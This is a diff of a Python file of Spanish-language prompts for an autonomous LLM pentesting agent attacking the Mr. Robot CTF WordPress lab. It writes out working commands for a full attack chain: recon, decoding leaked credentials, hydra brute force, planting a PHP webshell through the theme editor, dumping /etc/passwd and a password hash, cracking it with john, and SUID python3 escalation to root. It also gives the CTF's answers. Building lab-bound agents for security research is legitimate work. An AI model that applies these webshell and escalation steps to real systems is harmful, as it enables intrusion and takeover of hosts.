@@ -1,215 +1,311 @@
 """
 Prompts para el agente atacante.
 
-El diseno de prompts es critico para que el LLM tome decisiones coherentes.
-Se divide en un prompt de sistema (personalidad y reglas) y prompts por tactica
-(objetivo especifico y tecnicas disponibles).
+Cada prompt tactico define:
+  - OBJETIVO concreto (con criterio de exito verificable)
+  - TECNICAS MITRE asociadas
+  - PASOS sugeridos (secuencia tipica)
+  - CRITERIO DE EXITO (lo que el validator espera encontrar)
+  - RESTRICCIONES (errores comunes a evitar)
 
-El prompt de sistema establece que el agente es un pentester autonomo operando
-en un lab controlado. Cada prompt tactico da contexto sobre que lograr y que
-herramientas usar.
+El prompt admite feedback de replanificacion cuando el validator
+rechazo el avance de la tactica, y muestra acciones recientes para
+que el LLM pueda detectar loops por razonamiento.
 """
 
 ATTACKER_SYSTEM_PROMPT = """Eres un agente de penetration testing autonomo operando en un laboratorio \
-controlado autorizado. Tu objetivo es ejecutar una cadena de ataque siguiendo \
-las tacticas MITRE ATT&CK de forma metodica.
+controlado autorizado (CTF Mr. Robot). Tu objetivo es ejecutar una cadena de ataque \
+siguiendo las tacticas MITRE ATT&CK de forma metodica y verificable.
 
-REGLAS:
-- Ejecuta una accion a la vez. Analiza el resultado antes de decidir la siguiente.
-- Adapta tu estrategia segun los datos que vas recopilando.
+REGLAS DE OPERACION:
+- Ejecuta una accion a la vez y analiza el resultado antes de decidir la siguiente.
+- Cada tactica tiene un CRITERIO DE EXITO concreto que debe verificarse. No declares \
+una tactica como completa sin haber cumplido ese criterio.
+- Adapta tu estrategia segun los datos recopilados.
 - Si una tecnica falla, intenta una alternativa dentro de la misma tactica.
-- Cuando consideres que el objetivo de la tactica actual esta cumplido, indicalo.
-- Usa las herramientas disponibles (nmap, hydra, sqlmap, curl, comandos shell).
-- El target principal esta en {target_ip}.
+- Cuando el validador code-based te pida replanificar, lee con cuidado el feedback: \
+te dice exactamente que falta para cumplir el objetivo.
+- Si detectas que estas repitiendo variaciones de la misma accion sin avanzar, cambia \
+de enfoque radicalmente.
+- Entre cada tactica debes tener evidencia concreta en el historial: output real de \
+comandos, hashes, credenciales, respuestas HTTP especificas.
+
+NO HAGAS:
+- No declares "tactica completa" sin verificar el criterio de exito.
+- No inventes datos (credenciales, hashes) que no aparecieron en outputs reales.
+- No repitas la misma accion mas de 2 veces esperando un resultado distinto.
+- No confundas las fases: el POST /wp-login.php pertenece a Initial Access, NO a Execution.
+
+El target es {target_ip}.
 
 CONTEXTO DE SEGURIDAD:
-Esto es un laboratorio de simulacion con fines academicos. Todas las maquinas \
-son vulnerables intencionalmente. No hay sistemas reales en riesgo."""
+Laboratorio academico con maquinas vulnerables intencionalmente. Todas las herramientas \
+disponibles estan autorizadas. No hay sistemas reales en riesgo."""
+
 
 TACTIC_PROMPTS = {
     "reconnaissance": """TACTICA ACTUAL: Reconnaissance (TA0043)
 
-OBJETIVO: Descubrir servicios, puertos y tecnologias del target {target_ip}.
+OBJETIVO CONCRETO (debe cumplirse para avanzar):
+  1. Puerto 80/tcp confirmado abierto via nmap
+  2. Tecnologia web identificada (Apache, WordPress, PHP)
+  3. Al menos una ruta sensible descubierta (/robots.txt, /wp-login.php, /wp-admin, /license.txt)
 
-TECNICAS DISPONIBLES:
-- T1046 Network Service Discovery: usa nmap para escanear puertos y detectar servicios.
-- Enumeracion web: usa nikto para detectar tecnologias y vulnerabilidades HTTP.
-- Enumeracion de directorios: usa gobuster para descubrir rutas ocultas.
+TECNICAS MITRE:
+- T1046 Network Service Discovery: run_nmap con flags "-p- -sV -sC"
+- T1595 Active Scanning: run_nikto, run_gobuster
 
-QUE NECESITAS LOGRAR:
-1. Identificar puertos abiertos (especialmente HTTP 80 / HTTPS 443)
-2. Detectar tecnologias web (Apache, WordPress, PHP)
-3. Encontrar archivos clave: robots.txt, login pages, archivos de configuracion
-4. Identificar posibles vectores de ataque para Initial Access
+SECUENCIA SUGERIDA:
+1. run_nmap(target="{target_ip}", flags="-p- -sV -sC")
+2. run_gobuster(url="http://{target_ip}")  # descubre wp-admin, wp-login, robots.txt
+3. run_nikto(target="{target_ip}")  # opcional, muy verboso
+4. Descargar robots.txt para ver archivos expuestos
 
-DATOS RECOPILADOS HASTA AHORA:
-{collected_data}
-
-Cuando tengas un mapa claro de los servicios y tecnologias, indica que la tactica \
-esta completa.""",
+CRITERIO DE EXITO VERIFICABLE:
+- El output de nmap debe contener "80/tcp open"
+- Alguna accion debe mencionar Apache, WordPress o PHP
+- gobuster/nikto debe revelar /wp-login.php, /wp-admin, /robots.txt o /wp-content""",
 
     "initial_access": """TACTICA ACTUAL: Initial Access (TA0001)
 
-OBJETIVO: Obtener acceso de administrador al sistema target {target_ip}.
+OBJETIVO CONCRETO (debe cumplirse para avanzar):
+  1. Credenciales WordPress encontradas (usuario + password)
+  2. Login exitoso verificado: POST a /wp-login.php con respuesta HTTP 302 Location: /wp-admin/
 
-TECNICAS DISPONIBLES:
-- T1078 Valid Accounts: obtener credenciales validas e iniciar sesion en WordPress.
-- T1190 Exploit Public-Facing Application: explotar archivos expuestos para obtener credenciales.
+TECNICAS MITRE:
+- T1078 Valid Accounts: usar credenciales encontradas en archivos publicos
+- T1190 Exploit Public-Facing Application: descubrir credenciales en archivos expuestos
+- T1110.001 Brute Force (Password Guessing): hydra con wordlist si no hay pista directa
 
-PASOS RECOMENDADOS PARA WORDPRESS:
-1. Descargar robots.txt para identificar archivos expuestos:
-   run_command("curl -s http://{target_ip}/robots.txt")
-2. Examinar archivos de texto expuestos en busca de credenciales:
-   run_command("curl -s http://{target_ip}/license.txt")
-   Si el contenido parece base64, decodificarlo:
-   run_command("echo 'CONTENIDO_BASE64' | base64 -d")
-3. Si no se obtienen credenciales directas, enumerar usuarios y usar fuerza bruta:
-   run_wpscan(url="http://{target_ip}", flags="--enumerate u --disable-tls-checks")
-   run_command("hydra -l USUARIO_ENCONTRADO -P /opt/wordlists/mrrobot.txt {target_ip} http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:ERROR' -t 4 -f")
-4. Confirmar acceso con las credenciales obtenidas (reemplaza USUARIO y CREDENCIAL):
-   run_command("curl -s -D - -c /tmp/wp_cookies.txt -b 'wordpress_test_cookie=WP+Cookie+check' -d 'log=USUARIO&pwd=CREDENCIAL&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' http://{target_ip}/wp-login.php | head -15")
-   (Location: /wp-admin/ en los headers indica login exitoso)
+SECUENCIA SUGERIDA (ataque Mr. Robot CTF):
+1. run_command(command="curl -s http://{target_ip}/robots.txt")
+   — debe mostrar fsocity.dic y key-1-of-3.txt
+2. run_command(command="curl -s http://{target_ip}/license.txt | tail -5")
+   — al final hay un string base64: ZWxsaW90OkVSMjgtMDY1Mgo=
+3. run_command(command="echo 'ZWxsaW90OkVSMjgtMDY1Mgo=' | base64 -d")
+   — decodifica a elliot:ER28-0652
+4. VERIFICAR LOGIN con POST a wp-login.php:
+   run_command(command="curl -s -i -D - -c /tmp/wp_cookies.txt -b 'wordpress_test_cookie=WP+Cookie+check' -d 'log=elliot&pwd=ER28-0652&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' http://{target_ip}/wp-login.php | head -20")
+   — la respuesta DEBE contener "HTTP/1.1 302" y "Location: /wp-admin/"
+   — si aparece "ERROR" o la respuesta es 200 con el formulario, las credenciales son incorrectas
 
-QUE NECESITAS LOGRAR:
-1. Obtener credenciales de WordPress via archivos expuestos o fuerza bruta
-2. Iniciar sesion exitosamente (redireccion HTTP 302 a /wp-admin/)
+ALTERNATIVA SI NO HAY PISTAS DIRECTAS:
+- run_wpscan(url="http://{target_ip}", flags="--enumerate u")  # enumera usuarios
+- run_command(command="hydra -l USUARIO -P /opt/wordlists/mrrobot.txt {target_ip} http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:ERROR' -t 4 -f")
 
-DATOS RECOPILADOS HASTA AHORA:
-{collected_data}
+CRITERIO DE EXITO VERIFICABLE:
+- El historial debe contener un output con "elliot" y su password
+- Debe haber UN POST a /wp-login.php cuyo output contenga "302" y "/wp-admin/" en los headers
 
-Cuando tengas credenciales validas y sesion confirmada, indica que la tactica esta completa.""",
+ERRORES COMUNES:
+- No hacer el POST con el formato correcto (falta -d con el body)
+- No interpretar que 302 + Location es exito (es el indicador principal)
+- Declarar exito con un GET a /wp-login.php (GET != login)""",
 
     "execution": """TACTICA ACTUAL: Execution (TA0002)
 
-OBJETIVO: Desplegar una webshell en el target {target_ip} via WordPress y ejecutar comandos.
+OBJETIVO CONCRETO (debe cumplirse para avanzar):
+  1. Webshell PHP desplegada via WordPress theme editor
+  2. run_web_shell debe retornar output REAL del sistema (ej: "uid=33(www-data)" o "Linux ...")
+     — NO HTML de error 404
 
-TECNICAS DISPONIBLES:
-- T1059 Command and Scripting Interpreter: insertar webshell PHP en tema activo via panel admin de WordPress.
+TECNICAS MITRE:
+- T1059 Command and Scripting Interpreter (web shell PHP)
 
-PASOS PARA DESPLEGAR WEBSHELL VIA WORDPRESS THEME EDITOR:
-1. Autenticarse con las credenciales de Initial Access y guardar cookies de sesion:
-   run_command("curl -s -D - -c /tmp/wp_cookies.txt -b 'wordpress_test_cookie=WP+Cookie+check' -d 'log=USUARIO&pwd=CREDENCIAL&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' http://{target_ip}/wp-login.php | head -10")
-   (Location: /wp-admin/ en la respuesta indica login exitoso)
-2. Obtener el nonce _wpnonce del formulario HTML del editor de temas:
-   run_command("curl -s -b /tmp/wp_cookies.txt 'http://{target_ip}/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen' | grep -oP 'name=\"_wpnonce\" value=\"\\K[^\"]+' | head -1")
-3. Insertar webshell en 404.php (reemplaza NONCE; action=editedfile es el endpoint correcto para WordPress 4.x):
-   run_command("curl -s -b /tmp/wp_cookies.txt -X POST http://{target_ip}/wp-admin/theme-editor.php -d 'action=editedfile&_wpnonce=NONCE&file=404.php&theme=twentyfifteen&newcontent=%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29%7Bsystem%28%24_GET%5B%27cmd%27%5D%29%3B%7D%3F%3E'")
-4. Verificar que la webshell ejecuta comandos (el output debe ser texto del sistema, NO HTML):
+PREREQUISITO: cookies de sesion WP validas en /tmp/wp_cookies.txt (creadas en Initial Access)
+
+SECUENCIA SUGERIDA (despliegue via theme-editor):
+1. Obtener nonce del form editor de temas:
+   run_command(command="curl -s -b /tmp/wp_cookies.txt 'http://{target_ip}/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen' | grep -oP 'name=\\"_wpnonce\\" value=\\"\\K[^\\"]+' | head -1")
+2. Insertar webshell en 404.php del tema activo (reemplaza NONCE):
+   run_command(command="curl -s -b /tmp/wp_cookies.txt -X POST http://{target_ip}/wp-admin/theme-editor.php -d 'action=editedfile&_wpnonce=NONCE&file=404.php&theme=twentyfifteen&newcontent=%3C%3Fphp+if%28isset%28%24_GET%5B%27cmd%27%5D%29%29%7Bsystem%28%24_GET%5B%27cmd%27%5D%29%3B%7D+%3F%3E'")
+3. VERIFICAR webshell operativa:
    run_web_shell(cmd="id", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
-   Si el output contiene '<!DOCTYPE' o '<html', el deploy fallo — verifica el nonce y reintenta.
+   — el output DEBE contener "uid=" y NO debe tener "<!DOCTYPE" ni "<html"
+4. Doble check con otro comando:
    run_web_shell(cmd="uname -a", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
+   — el output DEBE empezar con "Linux"
 
-QUE NECESITAS LOGRAR:
-1. Sesion autenticada en el panel de administracion de WordPress
-2. Webshell PHP insertada en el tema activo y operativa
-3. RCE verificado: run_web_shell debe retornar texto del sistema (uid=33, Linux...), no HTML
+NOTA: el lab tiene una webshell pre-instalada en /wp-content/themes/twentyfifteen/404.php \
+como backup (para garantizar que el observer pueda ver la fase Execution incluso si el deploy \
+via theme-editor falla). Si run_web_shell con cmd="id" retorna uid=33 directamente, \
+puedes considerar la webshell como operativa aunque no hayas hecho el deploy.
 
-DATOS RECOPILADOS HASTA AHORA:
-{collected_data}
+CRITERIO DE EXITO VERIFICABLE:
+- Alguna accion de run_web_shell con cmd in {{id, uname, whoami}} debe retornar \
+texto del sistema (uid=, Linux, www-data) Y NO HTML
 
-Cuando la webshell este operativa y hayas ejecutado comandos exitosamente, \
-indica que la tactica esta completa.""",
+ERRORES COMUNES:
+- Confundir Execution con el login de wp-admin (eso es Initial Access)
+- Declarar exito cuando run_web_shell retorna el HTML del 404 de Apache
+- No probar la webshell despues de desplegarla""",
 
     "discovery": """TACTICA ACTUAL: Discovery (TA0007)
 
-OBJETIVO: Explorar el sistema comprometido {target_ip} usando la webshell desplegada.
+OBJETIVO CONCRETO (debe cumplirse para avanzar):
+  1. Enumeracion basica ejecutada via webshell: uname, whoami o id
+  2. Exploracion de /home o /etc/passwd via webshell
+  3. Hash MD5 de robot descubierto (formato: robot:<32 hex chars>)
 
-TECNICAS DISPONIBLES:
-- T1082 System Information Discovery: obtener info del OS via webshell.
-- T1083 File and Directory Discovery: enumerar archivos sensibles en el target.
+TECNICAS MITRE:
+- T1082 System Information Discovery
+- T1083 File and Directory Discovery
+- T1552 Unsecured Credentials
 
-EJECUTAR VIA WEBSHELL (url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php"):
+TODAS las acciones DEBEN usar run_web_shell con url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php"
+
+SECUENCIA SUGERIDA:
 1. run_web_shell(cmd="uname -a && whoami && id", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
 2. run_web_shell(cmd="cat /etc/passwd", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
 3. run_web_shell(cmd="ls -la /home/robot/", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
 4. run_web_shell(cmd="cat /home/robot/password.raw-md5", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
+   — debe retornar algo como "robot:c3fcd3d76192e4007dfb496cca67e13b"
 
-QUE NECESITAS LOGRAR:
-1. Identificar el OS y usuario actual (www-data)
-2. Encontrar /home/robot/password.raw-md5 y su contenido
-3. Registrar el hash MD5 para la siguiente fase (Credential Access)
+CRITERIO DE EXITO VERIFICABLE:
+- El output de la enumeracion debe tener uid=, Linux o un listado de /etc/passwd
+- El historial debe contener un string con formato "robot:" seguido de exactamente 32 chars hex
+- NO cuentan comandos ejecutados localmente en el container atacante: deben ir via webshell
 
-DATOS RECOPILADOS HASTA AHORA:
-{collected_data}
-
-IMPORTANTE: Si run_web_shell retorna HTML (contiene '<!DOCTYPE' o 'html'), la webshell no esta operativa. No declares la tactica completa hasta obtener output real del sistema operativo.
-
-Cuando tengas el hash de password de robot (formato: robot:HASH), indica que la tactica esta completa.""",
+ERRORES COMUNES:
+- Usar run_command (ejecuta local) en lugar de run_web_shell (ejecuta en target)
+- Conformarse con 1 solo comando — necesitas varias piezas de enumeracion""",
 
     "credential_access": """TACTICA ACTUAL: Credential Access (TA0006)
 
-OBJETIVO: Crackear el hash MD5 obtenido durante Discovery para obtener la contrasena del usuario robot.
+OBJETIVO CONCRETO (debe cumplirse para avanzar):
+  1. run_john ejecutado contra el hash MD5 descubierto en Discovery
+  2. Password crackeado (texto plano) en el output
 
-TECNICAS DISPONIBLES:
-- T1003 OS Credential Dumping: crackear hash MD5 con John the Ripper.
+TECNICAS MITRE:
+- T1110.002 Brute Force: Password Cracking
+- T1003 OS Credential Dumping
 
-PASOS:
-1. Usar john para crackear el hash encontrado en Discovery (usa el hash del historial de la conversacion):
-   run_john(hash_content="robot:HASH_MD5_ENCONTRADO")
-2. Una vez crackeada la contrasena, verificar acceso como robot via webshell:
-   run_web_shell(cmd="echo 'CONTRASENA_CRACKEADA' | su -s /bin/bash robot -c 'cat /home/robot/key-2-of-3.txt'", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
+PREREQUISITO: hash "robot:c3fcd3d76192e4007dfb496cca67e13b" obtenido en Discovery
+(consulta collected_data o el historial de mensajes)
 
-QUE NECESITAS LOGRAR:
-1. Crackear el hash MD5 del usuario robot
-2. Leer /home/robot/key-2-of-3.txt como usuario robot
+SECUENCIA SUGERIDA:
+1. run_john(hash_content="robot:c3fcd3d76192e4007dfb496cca67e13b", wordlist="/opt/wordlists/mrrobot.txt")
+   — si mrrobot.txt no existe o no crackea, probar con rockyou:
+     run_john(hash_content="robot:c3fcd3d76192e4007dfb496cca67e13b", wordlist="/usr/share/wordlists/rockyou.txt")
+   — el password esperado es "abcdefghijklmnopqrstuvwxyz"
+2. VERIFICAR el password con: john --show /tmp/hash_crack.txt
+   (run_john ya incluye --show al final del comando)
 
-DATOS RECOPILADOS HASTA AHORA:
-{collected_data}
+CRITERIO DE EXITO VERIFICABLE:
+- El output de alguna accion de run_john debe contener algo como "robot:<password>" \
+donde <password> NO es el hash (el password es texto legible, no 32 hex chars)
 
-IMPORTANTE: El hash debe provenir del output real de run_web_shell en la tactica Discovery. No declares completo hasta tener la contrasena crackeada confirmada por john.
-
-Cuando tengas la contrasena de robot y puedas leer key-2-of-3.txt, indica que la tactica esta completa.""",
+ERRORES COMUNES:
+- No pasar el hash exacto encontrado en Discovery
+- Usar el wordlist incorrecto (el password esta en mrrobot.txt, NO en rockyou)
+- Declarar exito sin ver el password crackeado""",
 
     "privilege_escalation": """TACTICA ACTUAL: Privilege Escalation (TA0004)
 
-OBJETIVO: Escalar de www-data a root en el target {target_ip} y leer key-3-of-3.txt.
+OBJETIVO CONCRETO (debe cumplirse para avanzar):
+  1. Binarios SUID enumerados (find / -perm -u=s)
+  2. Escalacion exitosa a root: uid=0 confirmado O lectura de /root/key-3-of-3.txt
 
-TECNICAS DISPONIBLES:
-- T1548 Abuse Elevation Control Mechanism: explotar binario python3 con SUID.
+TECNICAS MITRE:
+- T1548 Abuse Elevation Control Mechanism (SUID)
+- T1068 Exploitation for Privilege Escalation
 
-PASOS VIA WEBSHELL:
-1. Buscar binarios con SUID:
-   run_web_shell(cmd="find / -perm -u=s -type f 2>/dev/null", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
-2. Explotar python3 SUID para leer archivo de root:
-   run_web_shell(cmd="python3 -c \\"import os; os.setuid(0); os.system('cat /root/key-3-of-3.txt')\\"", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
-3. Confirmar acceso root:
-   run_web_shell(cmd="python3 -c \\"import os; os.setuid(0); os.system('id')\\"", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
+PREREQUISITO: webshell operativa en http://{target_ip}/wp-content/themes/twentyfifteen/404.php
 
-QUE NECESITAS LOGRAR:
-1. Identificar binario SUID explotable (python3)
-2. Ejecutar comando como root
-3. Leer /root/key-3-of-3.txt
+SECUENCIA SUGERIDA:
+1. run_web_shell(cmd="find / -perm -u=s -type f 2>/dev/null", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
+   — esperas ver /usr/bin/python3 o python3.X en la lista (el lab lo configura con SUID)
+2. Explotar python3 SUID para setuid(0):
+   run_web_shell(cmd="python3 -c 'import os; os.setuid(0); os.system(\\"id\\")'", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
+   — el output debe contener "uid=0(root)"
+3. Leer el flag como root:
+   run_web_shell(cmd="python3 -c 'import os; os.setuid(0); os.system(\\"cat /root/key-3-of-3.txt\\")'", url="http://{target_ip}/wp-content/themes/twentyfifteen/404.php")
+   — debe retornar un hash o string de texto, NO "Permission denied"
 
-DATOS RECOPILADOS HASTA AHORA:
-{collected_data}
+CRITERIO DE EXITO VERIFICABLE:
+- Alguna accion debe haber ejecutado "find / -perm -u=s"
+- Algun output debe contener "uid=0(root)" O el contenido de /root/key-3-of-3.txt
 
-Cuando hayas leido key-3-of-3.txt como root, indica que la tactica esta completa.""",
+ERRORES COMUNES:
+- Enumerar SUID y declarar exito (enumeracion != escalacion)
+- No usar os.setuid(0) antes de os.system (sin setuid NO se escala)
+- Intentar sudo o su sin contexto (no hay shell interactiva)""",
 }
 
 
-def build_tactic_prompt(tactic_name: str, target_ip: str, collected_data: dict) -> str:
-    """Construye el prompt contextualizado para la tactica actual."""
+def _format_recent_actions(actions: list[dict]) -> str:
+    """Formatea las ultimas acciones para detectar loops."""
+    if not actions:
+        return "  (ninguna accion previa en esta tactica)"
+    lines = []
+    for a in actions:
+        tool = a.get("technique", "?")
+        cmd = a.get("command", "")[:120]
+        out = a.get("output_preview", "")[:150].replace("\n", " ")
+        lines.append(f"  - {tool}({cmd}) -> {out}")
+    return "\n".join(lines)
+
+
+def build_tactic_prompt(
+    tactic_name: str,
+    target_ip: str,
+    collected_data: dict,
+    objective_feedback: str = "",
+    recent_actions: list[dict] | None = None,
+    replan_attempt: int = 0,
+) -> str:
+    """Construye el prompt de la tactica con todo el contexto necesario."""
     template = TACTIC_PROMPTS.get(tactic_name, "")
     if not template:
         return f"Ejecuta la tactica '{tactic_name}' contra {target_ip}."
 
-    data_str = _format_collected_data(collected_data)
-    return template.format(target_ip=target_ip, collected_data=data_str)
+    parts = [template.format(target_ip=target_ip)]
+
+    # Datos acumulados
+    parts.append("\nDATOS RECOPILADOS (collected_data):")
+    parts.append(_format_collected_data(collected_data))
+
+    # Acciones recientes (para deteccion de loops)
+    if recent_actions:
+        parts.append(
+            f"\nULTIMAS {len(recent_actions)} ACCIONES EN ESTA TACTICA "
+            "(revisa si estas en un loop):"
+        )
+        parts.append(_format_recent_actions(recent_actions))
+
+    # Feedback de replanificacion
+    if objective_feedback:
+        parts.append(
+            f"\n[REPLANIFICACION — intento {replan_attempt + 1}]"
+            f"\nEl validador code-based REVISO tus acciones anteriores y determino "
+            f"que el objetivo NO se cumple porque:"
+            f"\n  >> {objective_feedback}"
+            f"\n\nIMPORTANTE: lee cuidadosamente el feedback. Cambia de enfoque para "
+            f"atacar especificamente lo que falta. NO repitas las mismas acciones "
+            f"esperando distinto resultado."
+        )
+
+    parts.append(
+        "\nRazona paso a paso y ejecuta la siguiente accion. Cuando el objetivo "
+        "concreto se cumpla, declara la tactica completa sin mas tool_calls."
+    )
+
+    return "\n".join(parts)
 
 
 def _format_collected_data(data: dict) -> str:
     """Formatea los datos recopilados para incluirlos en el prompt."""
     if not data:
-        return "Revisa el historial de la conversacion para acceder a los hallazgos de tacticas anteriores."
+        return "  (vacio — aun no se ha recopilado nada)"
 
     parts = []
     for key, value in data.items():
         if isinstance(value, list):
-            parts.append(f"- {key}: {', '.join(str(v) for v in value)}")
+            parts.append(f"  - {key}: {', '.join(str(v) for v in value)}")
         elif isinstance(value, dict):
-            parts.append(f"- {key}:")
+            parts.append(f"  - {key}:")
             for k, v in value.items():
-                parts.append(f"    {k}: {v}")
+                parts.append(f"      {k}: {v}")
         else:
-            parts.append(f"- {key}: {value}")
+            parts.append(f"  - {key}: {value}")
     return "\n".join(parts)
